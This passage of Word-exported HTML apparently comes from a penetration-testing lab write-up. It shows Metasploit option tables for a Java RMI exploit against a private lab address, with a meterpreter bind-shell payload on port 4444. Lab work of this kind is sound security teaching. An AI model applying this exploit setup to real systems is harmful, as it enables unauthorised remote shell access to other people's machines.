;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The target address</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >RPORT</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >1099</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The target port</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:7.0500pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >SRVHOST</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >0.0.0.0</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The local host to listen</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >on.</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >This must be an address on</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >the</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >local machine or 0.0.0.0</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:7.0500pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >SRVPORT</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >8080</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The local port to listen</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr></table><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >on.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:51.3500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SSLCert</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >no</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Path to a custom</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SSL certificate</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:288.6000pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(default is randomly</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >generated)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:29.7500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >URIPATH</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >no</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >The URI to use for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >this exploit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:57.5500pt;margin-left:8.0000pt;text-indent:280.6000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >(default is random) Payload options (java/meterpreter/bind_tcp):</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><table class=MsoNormalTable  border=0  cellspacing=0  style="border-collapse:collapse;width:379.1000pt;margin-left:32.8500pt;mso-table-layout-alt:fixed;border:none;mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:13.5000pt;" ><td width=76  valign=top  style="width:45.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Name</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Current Setting</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Required</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=232  valign=top  style="width:139.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >Description</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=76  valign=top  style="width:45.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >----</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >---------------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=232  valign=top  style="width:139.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >-----------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=76  valign=top  style="width:45.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >LPORT</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >4444</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=232  valign=top  style="width:139.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The listen port</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=76  valign=top  style="width:45.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >RHOST</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >no</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=232  valign=top  style="width:139.2000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The target address</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr></table></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section256" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Exploit target:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Id</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Name</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >----</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Generic (Java</span><span 